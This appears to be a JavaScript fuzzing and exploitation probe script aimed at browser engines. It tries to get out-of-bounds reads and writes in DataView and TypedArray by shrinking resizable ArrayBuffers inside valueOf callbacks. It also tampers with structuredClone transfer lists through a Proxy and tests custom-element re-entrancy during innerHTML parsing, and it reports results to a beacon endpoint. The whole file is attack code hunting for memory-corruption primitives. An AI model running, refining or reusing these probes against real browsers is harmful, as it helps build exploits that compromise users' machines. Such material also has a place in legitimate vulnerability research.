// p127 — DataView + RAB valueOf exploitation probes
// DS V4 Pro Vector 3: DataView offset valueOf shrinks RAB → OOB write?
// Plus: Proxy transfer list manipulation, innerHTML CE re-entrancy
// Beacon prefix: V127D-
(function(){
var rid='v127d'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V127D-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V127D-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe127-start');

// ======== D1: DataView.setUint32 offset valueOf shrinks RAB ========
// The core hypothesis: does DataView cache byteLength/vector before toIndex(offset)?
function testD1(){
  var r={};
  try{
    var rab=new ArrayBuffer(4096,{maxByteLength:16384});
    r.rabOK=true;
    var dv=new DataView(rab);
    r.dvLen=dv.byteLength;

    // Fill with marker pattern
    for(var i=0;i<4096;i+=4) dv.setUint32(i,0xDEADBEEF);

    // Now: setUint32 where offset valueOf shrinks the RAB
    var shrunk=false;
    var poisonOffset={
      valueOf:function(){
        if(!shrunk){
          shrunk=true;
          rab.resize(64); // Shrink from 4096 to 64 bytes
        }
        return 256; // Write at offset 256 — past the new 64-byte boundary
      }
    };
    try{
      dv.setUint32(poisonOffset, 0x41414141);
      r.writeOK=true; // If this succeeds, we wrote OOB!
    }catch(e){
      r.writeErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.rabLenAfter=rab.byteLength;

    // Resize back up and check if our write landed past boundary
    rab.resize(4096);
    var checkDv=new DataView(rab);
    r.at256=checkDv.getUint32(256);
    r.oobWrite=(checkDv.getUint32(256)===0x41414141);

    // Check if DEADBEEF survived past shrink point
    var deadBeefs=0;
    for(var j=64;j<4096;j+=4){
      if(checkDv.getUint32(j)===0xDEADBEEF) deadBeefs++;
    }
    r.deadBeefsAfterShrink=deadBeefs;
    // Zero region check (did resize zero the grown area?)
    var zeros=0;
    for(var k=64;k<4096;k+=4){
      if(checkDv.getUint32(k)===0) zeros++;
    }
    r.zerosAfterGrow=zeros;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== D2: DataView.getFloat64 offset valueOf shrinks RAB ========
// Read side: can we read past the shrunk boundary?
function testD2(){
  var r={};
  try{
    var rab=new ArrayBuffer(4096,{maxByteLength:16384});
    var dv=new DataView(rab);
    // Write distinctive pattern at offset 512
    dv.setFloat64(512, 3.141592653589793);
    dv.setFloat64(520, 2.718281828459045);
    dv.setFloat64(528, 1.4142135623730951);

    var shrunk=false;
    var readOffset={
      valueOf:function(){
        if(!shrunk){
          shrunk=true;
          rab.resize(64);
        }
        return 512; // Read from offset 512 — past new 64-byte boundary
      }
    };
    try{
      var val=dv.getFloat64(readOffset);
      r.readOK=true;
      r.readVal=val;
      r.isPi=(val===3.141592653589793);
      // If isPi is true, we read stale data past the shrunk boundary = OOB read!
    }catch(e){
      r.readErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.rabLenAfter=rab.byteLength;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== D3: DataView multiple types — systematic test ========
// Test all DataView set methods with valueOf shrink
function testD3(){
  var r={};
  var methods=['setInt8','setUint8','setInt16','setUint16','setInt32','setUint32','setFloat32','setFloat64','setBigInt64','setBigUint64'];
  var values=[0x41, 0x41, 0x4141, 0x4141, 0x41414141, 0x41414141, 1.5, 1.5, null, null];
  r.results=[];

  for(var m=0;m<methods.length;m++){
    var method=methods[m];
    var val=values[m];
    var sub={method:method};

    try{
      var rab=new ArrayBuffer(1024,{maxByteLength:4096});
      var dv=new DataView(rab);
      var shrunk=false;
      var off={valueOf:function(){
        if(!shrunk){shrunk=true;rab.resize(32);}
        return 512;
      }};

      // BigInt methods need BigInt values
      if(method==='setBigInt64'||method==='setBigUint64'){
        if(typeof BigInt==='undefined'){sub.skip='no BigInt';r.results.push(sub);continue;}
        val=BigInt(0x4141414141414141n);
      }

      try{
        dv[method](off, val);
        sub.ok=true; // OOB write!
      }catch(e){
        sub.err=e.constructor.name;
      }
      sub.rabLen=rab.byteLength;
    }catch(e){
      sub.fatal=e.constructor.name;
    }
    r.results.push(sub);
  }
  return r;
}

// ======== D4: DataView VALUE valueOf shrinks (not offset) ========
// What if the value's valueOf shrinks the RAB AFTER offset is validated?
function testD4(){
  var r={};
  try{
    var rab=new ArrayBuffer(1024,{maxByteLength:4096});
    var dv=new DataView(rab);

    // Fill marker
    for(var i=0;i<1024;i+=4) dv.setUint32(i,0xBEEFCAFE);

    var shrunk=false;
    var poisonVal={
      valueOf:function(){
        if(!shrunk){
          shrunk=true;
          rab.resize(32); // Shrink AFTER offset 500 was validated
        }
        return 0x41414141;
      }
    };

    try{
      dv.setUint32(500, poisonVal); // Offset 500 is valid at entry, invalid after shrink
      r.writeOK=true;
    }catch(e){
      r.writeErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.rabLen=rab.byteLength;

    // Check: did the write land?
    rab.resize(1024);
    var check=new DataView(rab);
    r.at500=check.getUint32(500);
    r.oobWrite=(check.getUint32(500)===0x41414141);
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== D5: Proxy transfer list — swap items mid-walk ========
// p126 S5 showed transfer list is walked through Proxy traps
// Can we swap/add items during the walk?
function testD5(){
  var r={};
  try{
    var buf1=new ArrayBuffer(256);
    var buf2=new ArrayBuffer(512);
    new Uint8Array(buf1).fill(0xAA);
    new Uint8Array(buf2).fill(0xBB);

    var getCount=0;
    var items=[buf1];
    var proxyList=new Proxy(items,{
      get:function(target,prop){
        getCount++;
        if(prop==='0' && getCount>2){
          // After first access, swap buf1 for buf2
          return buf2;
        }
        if(prop==='length' && getCount>3){
          // Report longer length after initial read
          return 2;
        }
        return Reflect.get(target,prop);
      }
    });

    try{
      var result=structuredClone(buf1,{transfer:proxyList});
      r.cloneOK=true;
      r.resultLen=result.byteLength;
      r.buf1Detached=(buf1.byteLength===0);
      r.buf2Detached=(buf2.byteLength===0);
    }catch(e){
      r.cloneErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
    }
    r.getCount=getCount;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== D6: innerHTML + Custom Elements — re-entrant DOM mutation ========
// p126 showed: innerHTML fires onerror, Custom Elements callbacks are sync
// Chain: CE connectedCallback during innerHTML fires while parser holds state
function testD6(){
  var r={};
  try{
    var tag='x-reentry-'+Date.now();
    var callLog=[];
    var container=document.createElement('div');
    document.body.appendChild(container);

    var ElClass=function(){return Reflect.construct(HTMLElement,[],ElClass);};
    ElClass.prototype=Object.create(HTMLElement.prototype);
    ElClass.prototype.constructor=ElClass;
    ElClass.prototype.connectedCallback=function(){
      callLog.push('connected');
      // During connectedCallback from innerHTML parsing:
      // Try to mutate the container that's being parsed into
      try{
        container.insertAdjacentHTML('beforeend','<div class="injected">INJECTED</div>');
        callLog.push('injected-ok');
      }catch(e){
        callLog.push('inject-err:'+e.constructor.name);
      }
      // Try to clear the container (remove nodes the parser may reference)
      if(callLog.length===2){
        try{
          // Don't clear on first — just inject. Test re-entrancy depth.
          var child=document.createElement('span');
          child.textContent='dynamic';
          this.appendChild(child);
          callLog.push('child-added');
        }catch(e){
          callLog.push('child-err:'+e.constructor.name);
        }
      }
    };
    ElClass.prototype.disconnectedCallback=function(){
      callLog.push('disconnected');
    };

    customElements.define(tag,ElClass);

    // innerHTML with nested custom elements
    container.innerHTML='<'+tag+'><div>inner</div></'+tag+'><'+tag+'></'+tag+'>';
    r.callLog=callLog.join('|');
    r.childCount=container.children.length;
    r.injectedCount=container.querySelectorAll('.injected').length;

    // innerHTML again — triggers disconnect + connect
    callLog=[];
    container.innerHTML='<'+tag+'></'+tag+'>';
    r.callLog2=callLog.join('|');

    // Test: innerHTML with img onerror that accesses CE
    callLog=[];
    var tag2='x-onerror-'+Date.now();
    var El2=function(){return Reflect.construct(HTMLElement,[],El2);};
    El2.prototype=Object.create(HTMLElement.prototype);
    El2.prototype.constructor=El2;
    El2.prototype.connectedCallback=function(){callLog.push('ce2-connected');};
    customElements.define(tag2,El2);

    container.innerHTML='<img src="x" onerror="this.parentNode.querySelector(\''+tag2+'\').setAttribute(\'data-err\',\'1\')"><'+tag2+'></'+tag2+'>';

    // Wait for onerror
    return new Promise(function(resolve){
      setTimeout(function(){
        r.callLog3=callLog.join('|');
        var ce2=container.querySelector(tag2);
        r.ceAttr=ce2?ce2.getAttribute('data-err'):'null';
        container.remove();
        resolve(r);
      },100);
    });
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== D7: TypedArray.from() with valueOf that shrinks RAB ========
// TypedArray.from(source, mapFn) — does from() cache the output buffer size?
function testD7(){
  var r={};
  try{
    var rab=new ArrayBuffer(1024,{maxByteLength:4096});
    var ta=new Uint32Array(rab);
    r.taLen=ta.length; // 256

    // Create source array with valueOf objects
    var callCount=0;
    var src=[];
    for(var i=0;i<256;i++){
      src.push({valueOf:function(){
        callCount++;
        if(callCount===128){
          rab.resize(32); // Shrink target RAB mid-from()
        }
        return 0x42424242;
      }});
    }

    // TypedArray.from with the RAB-backed view as prototype hint
    try{
      var result=Uint32Array.from(src);
      r.fromOK=true;
      r.resultLen=result.length;
      // from() creates a NEW array, doesn't write to existing — but check
    }catch(e){
      r.fromErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
    }
    r.callCount=callCount;
    r.rabLen=rab.byteLength;

    // More interesting: ta.set(src) where src has valueOf
    rab.resize(1024);
    callCount=0;
    var src2=[];
    for(var j=0;j<200;j++){
      src2.push({valueOf:function(){
        callCount++;
        if(callCount===100) rab.resize(32);
        return 0x43434343;
      }});
    }
    try{
      ta.set(src2);
      r.setOK=true;
    }catch(e){
      r.setErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
    }
    r.setCallCount=callCount;
    r.rabLenAfterSet=rab.byteLength;

    // Did any 0x43434343 writes land past byte 32?
    rab.resize(1024);
    var check=new Uint32Array(rab);
    var oob43=0;
    for(var k=8;k<check.length;k++){
      if(check[k]===0x43434343) oob43++;
    }
    r.oob43Writes=oob43;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== Run all ========
async function runAll(){
  var tests=[
    {name:'D1-DV-WRITE-SHRINK',fn:testD1},
    {name:'D2-DV-READ-SHRINK',fn:testD2},
    {name:'D3-DV-ALL-TYPES',fn:testD3},
    {name:'D4-DV-VAL-SHRINK',fn:testD4},
    {name:'D5-PROXY-TRANSFER',fn:testD5},
    {name:'D6-INNER-CE',fn:testD6},
    {name:'D7-TA-FROM-RAB',fn:testD7}
  ];
  for(var t=0;t<tests.length;t++){
    try{
      var result=tests[t].fn();
      if(result&&typeof result.then==='function') result=await result;
      beacon(tests[t].name,result||{});
    }catch(e){
      beacon(tests[t].name,{fatal:e.constructor.name+':'+String(e.message||'').slice(0,80)});
    }
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
